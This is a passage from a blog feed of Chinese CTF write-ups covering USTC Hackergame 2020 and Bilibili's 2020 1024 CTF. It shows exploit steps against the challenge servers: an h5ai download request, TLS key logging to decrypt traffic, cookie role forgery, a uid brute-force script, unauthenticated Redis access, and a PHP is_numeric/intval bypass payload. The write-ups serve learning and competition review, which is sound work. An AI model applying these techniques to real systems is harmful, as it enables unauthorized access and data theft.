class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 